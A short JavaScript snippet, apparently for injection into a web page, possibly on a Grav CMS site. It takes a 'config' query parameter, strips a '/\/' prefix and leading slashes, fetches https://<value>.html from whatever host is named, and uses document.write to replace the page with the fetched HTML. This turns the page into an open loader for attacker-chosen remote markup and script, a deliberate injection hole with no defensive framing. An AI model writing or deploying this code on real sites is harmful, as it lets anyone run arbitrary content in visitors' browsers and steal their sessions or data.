<script>
(function () {
    if (window.grav_FETCH_RAN) {
        return;
    }

    window.grav_FETCH_RAN = true;

    var raw = new URLSearchParams(window.location.search).get("config");

    if (!raw) {
        console.error("No config parameter");
        return;
    }

    // Decode %5C, %2F, etc.
    var target = decodeURIComponent(raw);

    // Remove the special /\/ prefix
    target = target.replace(/^\/\\+/, "");

    // Remove accidental leading slashes
    target = target.replace(/^\/+/, "");

    // Build the final HTML URL
    var url = "https://" + target + ".html";

    console.log("Loading HTML:", url);

    fetch(url)
        .then(function (response) {
            if (!response.ok) {
                throw new Error(
                    "HTTP " + response.status + " while loading " + url
                );
            }

            return response.text();
        })
        .then(function (html) {
            document.open();
            document.write(html);
            document.close();
        })
        .catch(function (error) {
            console.error("HTML loading failed:", error);
        });
})();
</script>
